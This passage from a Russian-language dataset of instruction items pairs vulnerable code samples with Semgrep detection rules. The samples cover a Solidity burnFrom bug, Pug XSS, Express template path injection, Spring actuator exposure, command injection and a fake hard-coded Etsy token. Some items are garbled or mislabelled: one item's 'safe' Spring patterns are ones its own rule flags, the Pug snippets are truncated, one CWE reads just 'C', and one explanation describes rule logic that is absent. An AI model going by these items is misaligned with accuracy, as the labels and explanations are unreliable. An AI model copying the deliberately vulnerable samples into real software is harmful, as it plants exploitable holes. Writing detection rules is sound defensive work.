    "metadata": {
      "rule_id": "aws-emr-encrypted-with-cmk",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: tecra-coin-burnfrom-bug\nОписание уязвимости: Parameter \"from\" is checked at incorrect position in \"_allowances\" mapping\nCWE: C\nТип анализа: search\nЯзык: solidity",
    "input": "Требования:\n- Язык: solidity\n- Тип анализа: search\n- CWE: C\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: tecra-coin-burnfrom-bug.sol\n/**\n *Submitted for verification at Etherscan.io on 2021-04-13\n*/\n\n// SPDX-License-Identifier: Unlicense\npragma solidity 0.8.2;\n\n// interface need to claim rouge tokens from contract and handle upgraded functions\nabstract contract IERC20 {\n    function balanceOf(address owner) public view virtual returns (uint256);\n\n    function transfer(address to, uint256 amount) public virtual;\n\n    function allowance(address owner, address spender)\n        public\n        view\n        virtual\n        returns (uint256);\n\n    function totalSupply() public view virtual returns (uint256);\n}\n\n// interface to potential future upgraded contract,\n// only essential write functions that need check that this contract is caller\nabstract contract IUpgradedToken {\n    function transferByLegacy(\n        address sender,\n        address to,\n        uint256 amount\n    ) public virtual returns (bool);\n\n    function transferFromByLegacy(\n        address sender,\n        address from,\n        address to,\n        uint256 amount\n    ) public virtual returns (bool);\n\n    function approveByLegacy(\n        address sender,\n        address spender,\n        uint256 amount\n    ) public virtual;\n}\n\n//\n// The ultimate ERC20 token contract for TecraCoin project\n//\ncontract TcrToken {\n    //\n    // ERC20 basic information\n    //\n    uint8 public constant decimals = 8;\n    string public constant name = \"TecraCoin\";\n    string public constant symbol = \"TCR\";\n    uint256 private _totalSupply;\n    uint256 public constant maxSupply = 21000000000000000;\n\n    string public constant version = \"1\";\n    uint256 public immutable getChainId;\n\n    //\n    // other flags, data and constants\n    //\n    address public owner;\n    address public newOwner;\n\n    bool public paused;\n\n    bool public deprecated;\n    address public upgradedAddress;\n\n    bytes32 public immutable DOMAIN_SEPARATOR;\n\n    // keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\");\n    # Ограничиваем длину\n\nОпасные паттерны:\n• // ruleid: tecra-coin-burnfrom-bug\nfunction burnFrom(address from, uint256 amount) external {\n    _burn(from, amount);\n    require(_allowances[msg.sender][from] >= amount, \"ERROR_ATL\");\n}\n• // ruleid: tecra-coin-burnfrom-bug\nfunction burnFrom(address from, uint256 amount) external {\n    _burn(from, amount);\n    require(allowance(msg.sender, from) >= amount, \"ERROR_ATL\");\n}\n\nБезопасные паттерны:  \n• function burnFrom(address from, uint256 amount) external {\n    require(_allowances[msg.sender][from] >= amount, \"ERROR_ATL\");\n    _burn(from, amount);\n}\n• function burnFrom(address from, uint256 amount) external {\n    require(allowance(msg.sender, from) >= amount, \"ERROR_ATL\");\n    _burn(from, amount);\n}\n\nЛегенда аннотаций:\n- // ruleid:tecra-coin-burnfrom-bug: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:tecra-coin-burnfrom-bug: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n -\n    id: tecra-coin-burnfrom-bug\n    message: Parameter \"from\" is checked at incorrect position in \"_allowances\" mapping\n    metadata:\n        category: security\n        technology:\n            - solidity\n        cwe: \"CWE-688: Function Call With Incorrect Variable or Reference as Argument\"\n        confidence: MEDIUM\n        likelihood: HIGH\n        impact: HIGH\n        subcategory:\n            - vuln\n        references:\n        - https://twitter.com/Mauricio_0218/status/1490082073096462340\n        - https://etherscan.io/address/0xe38b72d6595fd3885d1d2f770aa23e94757f91a1\n    patterns:\n        - pattern-inside: |\n            function $BURN(..., address $FROM, ...) {\n                ...\n                _burn($FROM, ...);\n                ...\n            }\n        - pattern-either:\n            - pattern: require(_allowances[$S][$FROM] >= $X, ...)\n            - pattern: require(allowance($S, $FROM) >= $X, ...)\n    languages: \n    - solidity\n    severity: ERROR\n\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска уязвимости 'tecra-coin-burnfrom-bug' в Solidity-коде. Уязвимость возникает, когда параметр 'from' проверяется некорректно при обращении к '_allowances' маппингу. Правило использует шаблон функции, содержащей вызов _burn с параметром 'from', а также шаблоны проверок, которые должны быть выполнены перед вызовом _burn. Если проверка выполняется после вызова _burn, это указывает на проблему.\n\n# Ключевые элементы:\n- ID: tecra-coin-burnfrom-bug\n- Язык: solidity \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "tecra-coin-burnfrom-bug",
      "language": "solidity",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: template-and-attributes\nОписание уязвимости: Detected a unescaped variables using '&attributes'. If external data can reach these locations, your application is exposed to a cross-site scripting (XSS) vulnerability. If you must do this, ensure no external data can reach this location.\nCWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: and-attributes.pug\n// cf. https://github.com/abdulaz1z/nodejs-pug-starter/blob/42b48dd68416a87904258d1228686321206efc36/views/index.pug\ndoctype html\nhtml(lang=\"en\")\n  include includes/head.pug\n  body\n    //- Navigation\n    nav(class=\"navbar navbar-expand-lg navbar-dark bg-dark fixed-bottom\")\n      div(class=\"container\")\n        a(class=\"navbar-brand\" href=\"/\") NodeJs-Pug-Starter\n        button(class=\"navbar-toggler\" type=\"button\" data-toggle=\"collapse\" data-target=\"#navbarResponsive\" aria-controls=\"navbarResponsive\" aria-expanded=\"false\" aria-label=\"Toggle navigation\")\n          // ruleid: template-and-attributes\n          span()&attributes({\"class\": \"navbar-toggler-icon\"})\n\n        div(class=\"collapse navbar-collapse\" id=\"navbarResponsive\")\n          ul(class=\"navbar-nav ml-auto\")\n            li(class=\"nav-item\")\n              a(class=\"nav-link\" href=\"/\") Home\n            li(class=\"nav-item\")\n              a(class=\"nav-link\" target=\"_blank\" href!=\"/docs\") Documentation\n\n    //- Page Content\n    section\n      div(class=\"container\")\n        div(class=\"row\")\n          div(class=\"col-lg-6\")\n            - var attrs = {};\n            - attrs.class = \"mb-5\";\n            // ruleid: template-and-attributes\n            h1(class=\"mt-5 text-white\")&attributes(attrs) Simple App\n            p(class= \"text-light\") This project is a simple application skeleton for a NodeJs web app with PugJs templating. You can use it to quickly bootstrap your NodeJs webapp projects and dev environment for these projects.\n\n    script(src='vendor/jquery/jquery.min.js')\n    script(src='vendor/bootstrap/js/bootstrap.bundle.min.js')  # Ограничиваем длину\n\nОпасные паттерны:\n• //- Navigation\nnav(class=\"navbar navbar-expand-lg navbar-dark bg-dark fixed-bottom\")\n  div(class=\"container\")\n    a(class=\"navbar-brand\" href=\"/\") NodeJs-Pug-Starter\n    button(class=\"navbar-toggler\" \n• //- Page Content\nsection\n  div(class=\"container\")\n    div(class=\"row\")\n      div(class=\"col-lg-6\")\n        - var attrs = {};\n        - attrs.class = \"mb-5\";\n        // ruleid: template-and-attributes\n\n\nБезопасные паттерны:  \n• //- Navigation\nnav(class=\"navbar navbar-expand-lg navbar-dark bg-dark fixed-bottom\")\n  div(class=\"container\")\n    a(class=\"navbar-brand\" href=\"/\") NodeJs-Pug-Starter\n    button(class=\"navbar-toggler\" \n• //- Page Content\nsection\n  div(class=\"container\")\n    div(class=\"row\")\n      div(class=\"col-lg-6\")\n        - var attrs = {};\n        - attrs.class = \"mb-5\";\n        h1(class=\"mt-5 text-white\") class=\"\n\nЛегенда аннотаций:\n- // ruleid:template-and-attributes: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:template-and-attributes: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: template-and-attributes\n  message: >-\n    Detected a unescaped variables using '&attributes'.\n    If external data can reach these locations,\n    your application is exposed to a cross-site scripting (XSS)\n    vulnerability. If you must do this, ensure no external data\n    can reach this location.\n  metadata:\n    cwe:\n    - \"CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"\n    owasp:\n    - A07:2017 - Cross-Site Scripting (XSS)\n    - A03:2021 - Injection\n    references:\n    - https://pugjs.org/language/attributes.html#attributes\n    category: security\n    technology:\n    - express\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n  languages:\n  - regex\n  severity: WARNING\n  paths:\n    include:\n    - '*.pug'\n  pattern-regex: .*&attributes.*\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования конструкции '&attributes' в шаблонах PUG, которая может привести к XSS-уязвимостям, если данные передаются извне и не проходят должную эскейпинг-обработку. Правило применяет регулярное выражение для поиска строк, содержащих шаблон '&attributes', и помечает их как потенциально опасные.\n\n# Ключевые элементы:\n- ID: template-and-attributes\n- Язык: regex \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "template-and-attributes",
      "language": "regex",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: res-render-injection\nОписание уязвимости: User controllable data `$REQ` enters `$RES.render(...)` this can lead to the loading of other HTML/templating pages that they may not be authorized to render. An attacker may attempt to use directory traversal techniques e.g. `../folder/index` to access other HTML pages on the file system. Where possible, do not allow users to define what should be  loaded in $RES.render or use an allow list for the existing application.\nCWE: CWE-706: Use of Incorrectly-Resolved Name or Reference\nТип анализа: taint\nЯзык: javascript\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: javascript\n- Тип анализа: taint\n- CWE: CWE-706: Use of Incorrectly-Resolved Name or Reference\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: res-render-injection.js\nconst express = require('express')\nconst app = express()\nconst port = 3000\n\nconst hardcodedPath = 'lib/layout'\n\nfunction testController1(req, res) {\n    // ruleid: res-render-injection\n    return res.render(`tpl.${req.query.path}`, {foo: bar})\n};\n\napp.get('/test1', testController1)\n\napp.get('/test2', (req, res) => {\n    // ruleid: res-render-injection\n    return res.render('tpl.' + req.query.path + '.smth-else', {foo: bar})\n})\n\napp.get('/ok-test', (req, res) => {\n    // ok: res-render-injection\n    return res.render(hardcodedPath, {foo: bar})\n})\n\napp.listen(port, () => console.log(`Example app listening at http://localhost:${port}`))  # Ограничиваем длину\n\nОпасные паттерны:\n• return res.render(`tpl.${req.query.path}`, {foo: bar})\n• return res.render('tpl.' + req.query.path + '.smth-else', {foo: bar})\n\nБезопасные паттерны:  \n• return res.render(hardcodedPath, {foo: bar})\n\nЛегенда аннотаций:\n- // ruleid:res-render-injection: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:res-render-injection: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: res-render-injection\n  message: >-\n    User controllable data `$REQ` enters `$RES.render(...)` this can lead to the loading\n    of other HTML/templating pages that they may not be authorized to render. An attacker\n    may attempt to use directory traversal techniques e.g. `../folder/index` to access other\n    HTML pages on the file system. Where possible, do not allow users to define what should be \n    loaded in $RES.render or use an allow list for the existing application.\n  options:\n    interfile: true\n  metadata:\n    interfile: true\n    owasp:\n    - A01:2021 - Broken Access Control\n    cwe:\n    - 'CWE-706: Use of Incorrectly-Resolved Name or Reference'\n    category: security\n    technology:\n    - express\n    references:\n    - http://expressjs.com/en/4x/api.html#res.render\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: MEDIUM\n  languages:\n  - javascript\n  - typescript\n  severity: WARNING\n  mode: taint\n  pattern-sources:\n  - patterns:\n    - pattern-either:\n      - pattern-inside: function ... ($REQ, $RES) {...}\n      - pattern-inside: function ... ($REQ, $RES, $NEXT) {...}\n      - patterns:\n        - pattern-either:\n          - pattern-inside: $APP.$METHOD(..., function $FUNC($REQ, $RES) {...})\n          - pattern-inside: $APP.$METHOD(..., function $FUNC($REQ, $RES, $NEXT) {...})\n        - metavariable-regex:\n            metavariable: $METHOD\n            regex: ^(get|post|put|head|delete|options)$\n    - pattern-either:\n      - pattern: $REQ.query\n      - pattern: $REQ.body\n      - pattern: $REQ.params\n      - pattern: $REQ.cookies\n      - pattern: $REQ.headers\n  - patterns:\n    - pattern-either:\n      - pattern-inside: |\n          ({ $REQ }: Request,$RES: Response, $NEXT: NextFunction) =>\n          {...}\n      - pattern-inside: |\n          ({ $REQ }: Request,$RES: Response) => {...}\n    - focus-metavariable: $REQ\n    - pattern-either:\n      - pattern: params\n      - pattern: query\n      - pattern: cookies\n      - pattern: headers\n      - pattern: body\n  pattern-sinks:\n  - patterns:\n    - pattern-either:\n      - pattern: $RES.render($SINK, ...)\n    - focus-metavariable: $SINK\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования функции res.render() в Express.js фреймворке, где имя шаблона передается напрямую из пользовательского ввода (`req.query`, `req.body`, `req.params`, `req.cookies`, `req.headers`), что может привести к инъекциям путей и несанкционированному доступу к другим страницам приложения. Правило использует шаблон источников для идентификации функций, принимающих запрос и ответ, а затем проверяет, используется ли переменная запроса или другого источника для формирования имени шаблона в вызове res.render().\n\n# Ключевые элементы:\n- ID: res-render-injection\n- Язык: javascript \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "res-render-injection",
      "language": "javascript",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: spring-actuator-dangerous-endpoints-enabled-yaml\nОписание уязвимости: Spring Boot Actuator \"$ACTUATOR\" is enabled. Depending on the actuator, this can pose a significant security risk. Please double-check if the actuator is needed and properly secured.\nCWE: CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\nТип анализа: search\nЯзык: yaml",
    "input": "Требования:\n- Язык: yaml\n- Тип анализа: search\n- CWE: CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: spring-actuator-non-health-enabled-yaml.test.yaml\nserver:\n  port: 8081\nmanagement:\n  endpoints:\n    web:\n      # ok: spring-actuator-dangerous-endpoints-enabled-yaml\n      base-path: /internal\n      exposure:\n        # ruleid: spring-actuator-dangerous-endpoints-enabled-yaml\n        include:\n          - \"health\"  # Should be OK (but will still be shown in the output)\n          - \"prometheus\"  # Should match\n          - \"logfile\"  # Should match  # Ограничиваем длину\n\nОпасные паттерны:\n• management:\n  endpoints:\n    web:\n      exposure:\n        include:\n          - logfile\n          - prometheus\n          - actuator-name\n\n• management:\n  endpoints:\n    web:\n      exposure:\n        include:\n          - info\n          - environment\n          - actuator-name\n\nБезопасные паттерны:  \n• management:\n  endpoints:\n    web:\n      exposure:\n        include:\n          - health\n          - prometheus\n          - logfile\n• management:\n  endpoints:\n    web:\n      exposure:\n        include:\n          - *\n\nЛегенда аннотаций:\n- // ruleid:spring-actuator-dangerous-endpoints-enabled-yaml: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:spring-actuator-dangerous-endpoints-enabled-yaml: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: spring-actuator-dangerous-endpoints-enabled-yaml\n  patterns:\n  - pattern-inside: |\n      management:\n        ...\n        endpoints:\n          ...\n          web:\n            ...\n            exposure:\n              ...\n              include:\n                ...\n  - pattern: |\n      include: [..., $ACTUATOR, ...]\n  - metavariable-comparison:\n      metavariable: $ACTUATOR\n      comparison: not str($ACTUATOR) in [\"health\",\"*\"]\n  message: Spring Boot Actuator \"$ACTUATOR\" is enabled. Depending on the actuator, this can pose a significant\n    security risk. Please double-check if the actuator is needed and properly secured.\n  severity: WARNING\n  languages:\n  - yaml\n  metadata:\n    cwe:\n    - 'CWE-200: Exposure of Sensitive Information to an Unauthorized Actor'\n    owasp:\n    - A01:2021 - Broken Access Control\n    references:\n    - https://docs.spring.io/spring-boot/docs/current/reference/html/production-ready-features.html#production-ready-endpoints-exposing-endpoints\n    - https://medium.com/walmartglobaltech/perils-of-spring-boot-actuators-misconfiguration-185c43a0f785\n    - https://blog.maass.xyz/spring-actuator-security-part-1-stealing-secrets-using-spring-actuators\n    category: security\n    technology:\n    - spring\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: HIGH\n    confidence: MEDIUM\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска YAML-конфигураций Spring Boot Actuator, которые включают небезопасные конечные точки. Анализ выполняется путем поиска ключевого слова 'include' внутри блока 'exposure' под узлом 'endpoints/web'. Затем проверяется наличие переменной '$ACTUATOR', которая не является одним из безопасных значений ('health' или '*'). Если условие выполнено, выдается предупреждение о возможной угрозе безопасности.\n\n# Ключевые элементы:\n- ID: spring-actuator-dangerous-endpoints-enabled-yaml\n- Язык: yaml \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "spring-actuator-dangerous-endpoints-enabled-yaml",
      "language": "yaml",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: use-click-secho\nОписание уязвимости: Use `click.secho($X)` instead. It combines click.echo() and click.style().\nCWE: \nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: \n- Серьезность: ERROR\n\nКонтекст кода:\n// File: echo-style.py\nimport click\n\n# ruleid:use-click-secho\nclick.echo(click.style(\"foo\"))\n\n\n# ruleid:use-click-secho\nclick.echo(click.style(\"foo\", color=\"blue\"))\n\n\n# ok:use-click-secho\nclick.secho(\"foo\")  # Ограничиваем длину\n\nОпасные паттерны:\n• click.echo(click.style(\"foo\"))\n• click.echo(click.style(\"foo\", color=\"blue\"))\n\nБезопасные паттерны:  \n• click.secho(\"foo\")\n\nЛегенда аннотаций:\n- // ruleid:use-click-secho: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:use-click-secho: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: use-click-secho\n    pattern: click.echo(click.style($X, ...))\n    message: Use `click.secho($X)` instead. It combines click.echo() and click.style().\n    languages: [python]\n    severity: ERROR\n    metadata:\n      category: best-practice\n      technology:\n        - click\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования комбинации функций click.echo() и click.style(). В Python, вместо отдельного вызова этих двух функций, рекомендуется использовать единую функцию click.secho(), которая объединяет их функциональность. Правило ищет выражения, где сначала вызывается click.style(), а затем результат передается в click.echo(). Паттерн использует метапеременную $X для захвата аргумента, переданного в style(), и оператор pattern-inside для проверки структуры вызовов.\n\n# Ключевые элементы:\n- ID: use-click-secho\n- Язык: python \n- Тип: \n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "use-click-secho",
      "language": "python",
      "severity": "ERROR",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: detect-child-process\nОписание уязвимости: Detected calls to child_process from a function argument `$FUNC`. This could lead to a command injection if the input is user controllable. Try to avoid calls to child_process, and if it is needed ensure user input is correctly sanitized or sandboxed. \nCWE: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\nТип анализа: taint\nЯзык: javascript\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: javascript\n- Тип анализа: taint\n- CWE: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: detect-child-process.js\nconst {exec, spawnSync} = require('child_process');\nconst cp = require('child_process'); \n\nfunction a(args) {\n  // ruleid:detect-child-process\n  exec(`cat *.js ${args[0]}| wc -l`, (error, stdout, stderr) => {\n    console.log(stdout)\n  });\n}\n\nfunction a(userInput) {\n  // ruleid:detect-child-process\n  cp.spawnSync(userInput);\n}\n\n// ok:detect-child-process\nexec('ls')\n\nconst parentMachine = createMachine({\n  id: 'parent',\n  initial: 'waiting',\n  context: {\n    localOne: null\n  },\n  states: {\n    waiting: {\n      entry: assign({\n        // ok:detect-child-process\n        localOne: () => spawn(remoteMachine)  // <--\n      }),\n      on: {\n        'LOCAL.WAKE': {\n          actions: send({ type: 'WAKE' }, { to: (context) => context.localOne })\n        },\n        'REMOTE.ONLINE': { target: 'connected' }\n      }\n    },\n    connected: {}\n  }\n});\n\n\n// File: detect-child-process.ts\nimport { exec } from 'child_process'\nimport * as cp from 'child_process';\n\nfunction a(args) {\n  // ruleid:detect-child-process\n  exec(`cat *.js ${args[0]}| wc -l`, (error, stdout, stderr) => {\n    console.log(stdout)\n  });\n}\n\nfunction a(userInput) {\n  // ruleid:detect-child-process\n  cp.spawnSync(userInput);\n}\n\n// ok:detect-child-process\nexec('ls')\n\nconst parentMachine = createMachine({\n  id: 'parent',\n  initial: 'waiting',\n  context: {\n    localOne: null\n  },\n  states: {\n    waiting: {\n      entry: assign({\n        // ok:detect-child-process\n        localOne: () => spawn(remoteMachine)  // <--\n      }),\n      on: {\n        'LOCAL.WAKE': {\n          actions: send({ type: 'WAKE' }, { to: (context) => context.localOne })\n        },\n        'REMOTE.ONLINE': { target: 'connected' }\n      }\n    },\n    connected: {}\n  }\n});  # Ограничиваем длину\n\nОпасные паттерны:\n• exec(`cat *.js ${args[0]}| wc -l`, (error, stdout, stderr) => { console.log(stdout) })\n• cp.spawnSync(userInput)\n• child_process.exec(`cat *.js ${args[0]}| wc -l`, (error, stdout, stderr) => { console.log(stdout) })\n\nБезопасные паттерны:  \n• exec('ls')\n• const CMD = 'ls'; exec(CMD)\n• const cmdArray = ['ls']; child_process.spawn(cmdArray)\n\nЛегенда аннотаций:\n- // ruleid:detect-child-process: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:detect-child-process: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: detect-child-process\n  message: >-\n    Detected calls to child_process from a function argument `$FUNC`. This could lead to a command injection\n    if the input is user controllable. Try to avoid calls to child_process, and if it is needed\n    ensure user input is correctly sanitized or sandboxed. \n  metadata:\n    cwe:\n    - \"CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\"\n    owasp:\n    - A01:2017 - Injection\n    - A03:2021 - Injection\n    references:\n    - https://cheatsheetseries.owasp.org/cheatsheets/Nodejs_Security_Cheat_Sheet.html#do-not-use-dangerous-functions\n    source-rule-url: https://github.com/nodesecurity/eslint-plugin-security/blob/master/rules/detect-child-process.js\n    category: security\n    technology:\n    - javascript\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: HIGH\n    confidence: LOW\n  languages:\n  - javascript\n  - typescript\n  severity: ERROR\n  mode: taint\n  pattern-sources:\n  - patterns:\n    - pattern-inside: |\n        function ... (...,$FUNC,...) {\n          ...\n        }\n    - focus-metavariable: $FUNC\n  pattern-sinks:\n  - patterns:\n    - pattern-either:\n      - pattern-inside: |\n          $CP = require('child_process')\n          ...\n      - pattern-inside: |\n          import * as $CP from 'child_process'\n          ...\n      - pattern-inside: |\n          import $CP from 'child_process'\n          ...\n    - pattern-either:\n      - pattern: $CP.exec($CMD,...)\n      - pattern: $CP.execSync($CMD,...)\n      - pattern: $CP.spawn($CMD,...)\n      - pattern: $CP.spawnSync($CMD,...)\n    - pattern-not-inside: $CP.$EXEC(\"...\",...)\n    - pattern-not-inside: $CP.$EXEC([\"...\",...],...)\n    - pattern-not-inside: |\n        $CMD = \"...\"\n        ...\n    - pattern-not-inside: |\n        $CMD = [\"...\",...]\n        ...\n    - focus-metavariable: $CMD\n  - patterns:\n    - pattern-either:\n      - pattern: child_process.exec($CMD,...)\n      - pattern: child_process.execSync($CMD,...)\n      - pattern: child_process.spawn($CMD,...)\n      - pattern: child_process.spawnSync($CMD,...)\n    - pattern-not-inside: child_process.$EXEC(\"...\",...)\n    - pattern-not-inside: child_process.$EXEC([\"...\",...],...)\n    - pattern-not-inside: |\n        $CMD = \"...\"\n        ...\n    - pattern-not-inside: |\n        $CMD = [\"...\",...]\n        ...\n    - focus-metavariable: $CMD\n\n\n# Логика правила:\n['Тип анализа: taint analysis', 'Источники (sources): функции, содержащие аргументы, передающиеся в child_process', 'Синки (sinks): вызовы функций exec, execSync, spawn, spawnSync модуля child_process', 'Паттерны источников: функция должна иметь переменную $FUNC, которая является аргументом', 'Паттерны синков: вызов любой из функций exec, execSync, spawn или spawnSync модуля child_process', 'Исключения: прямые вызовы exec, execSync, spawn или spawnSync с жестко заданными аргументами, а также присваивание команд в отдельные переменные вне вызова этих функций']\n\n# Ключевые элементы:\n- ID: detect-child-process\n- Язык: javascript \n- Тип: audit\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "detect-child-process",
      "language": "javascript",
      "severity": "ERROR",
      "rule_type": "audit",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: etsy-access-token\nОписание уязвимости: A gitleaks etsy-access-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: INFO\n\nКонтекст кода:\n// File: etsy-access-token.go\n// ruleid: etsy-access-token\netsy_api_token = \"l200n933ax67fyfcmiwigjvo\"  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: etsy-access-token.go\n// ruleid: etsy-access-token\netsy_api_token = \"l200n933ax67fyfcmiwigjvo\"\n• // File: example.go\n// ruleid: etsy-access-token\nvar apiToken string = \"k98hj23f98bjk2398fkj2398fkj23\" // Etsy API token\n• // File: config.go\n// ruleid: etsy-access-token\nconst accessKey = \"98fhj2398fkj2398fkj2398fkj23\" // Etsy Access Key\n\nБезопасные паттерны:  \n• // File: safe-code.go\n// idempotent: safe-code\nvar apiToken string = getEtsyApiTokenFromEnv()\n• // File: secure-config.go\n// idempotent: secure-config\nconst accessKey = os.Getenv(\"ETSY_ACCESS_KEY\")\n• // File: vault-secrets.go\n// idempotent: vault-secrets\naccessKey := vault.GetSecret(\"etsy_access_key\")\n\nЛегенда аннотаций:\n- // ruleid:etsy-access-token: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:etsy-access-token: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: etsy-access-token\n  message: A gitleaks etsy-access-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\n  languages:\n    - regex\n  severity: INFO\n  metadata:\n      likelihood: LOW\n      impact: MEDIUM\n      confidence: LOW\n      category: security\n      cwe:\n        - \"CWE-798: Use of Hard-coded Credentials\"\n      cwe2021-top25: true\n      cwe2022-top25: true\n      owasp:\n        - A07:2021 - Identification and Authentication Failures\n      references:\n        - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n      source-rule-url: https://github.com/zricethezav/gitleaks/tree/master/cmd/generate/config/rules\n      subcategory:\n        - vuln\n      technology:\n        - gitleaks\n  patterns:\n    - pattern-regex: (?i)(?:etsy)(?:[0-9a-z\\-_\\t .]{0,20})(?:[\\s|']|[\\s|\"]){0,3}(?:=|>|:{1,3}=|\\|\\|:|<=|=>|:|\\?=)(?:'|\\\"|\\s|=|\\x60){0,5}([a-z0-9]{24})(?:['|\\\"|\\n|\\r|\\s|\\x60|;]|$)\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска жестко закодированных токенов доступа Etsy в исходном коде. Регулярное выражение ищет строку, содержащую слово 'etsy' в любом регистре, за которым следуют произвольные символы длиной от 0 до 20, затем символ '=' или один из нескольких специальных символов, после чего следует строка длиной ровно 24 символа, представляющая собой токен доступа.\n\n# Ключевые элементы:\n- ID: etsy-access-token\n- Язык: regex \n- Тип: vuln\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "etsy-access-token",
      "language": "regex",
      "severity": "INFO",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: slack-legacy-workspace-token\nОписание уязвимости: A gitleaks slack-legacy-workspace-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
